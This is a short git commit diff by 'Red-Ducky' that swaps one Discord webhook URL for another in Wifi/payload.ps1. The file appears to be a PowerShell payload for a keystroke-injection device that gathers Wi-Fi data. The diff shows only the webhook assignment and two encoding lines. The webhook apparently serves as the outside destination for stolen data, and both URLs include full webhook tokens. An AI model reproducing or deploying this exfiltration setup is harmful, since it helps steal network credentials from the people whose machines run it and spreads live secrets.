bb0bfb671efdeb95a22f801739a203cfc8292207
Red-Ducky <galaxy2yt2.0@gmail.com>
2026-05-22 15:03:53 +0200

    Update payload.ps1

--- Wifi/payload.ps1
+++ Wifi/payload.ps1
@@ -1,4 +1,4 @@
-$webhookUrl = "https://discord.com/api/webhooks/1501460061439004732/fE-P3g0HI2ha_ZKMhWmn1woNkl8yzMz_sLLFffMnk4xa1JtNDy0PodilxIiB7BlEvS_m"
+$webhookUrl = "https://discord.com/api/webhooks/1507367892931444838/3OUYfxRFIP45H3YoAmAPZCqP3LfB6-gGAKMsqyiuIw_CdNqM2aFWilHwn65GyXZt5CBi"
 
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 $OutputEncoding = [System.Text.Encoding]::UTF8
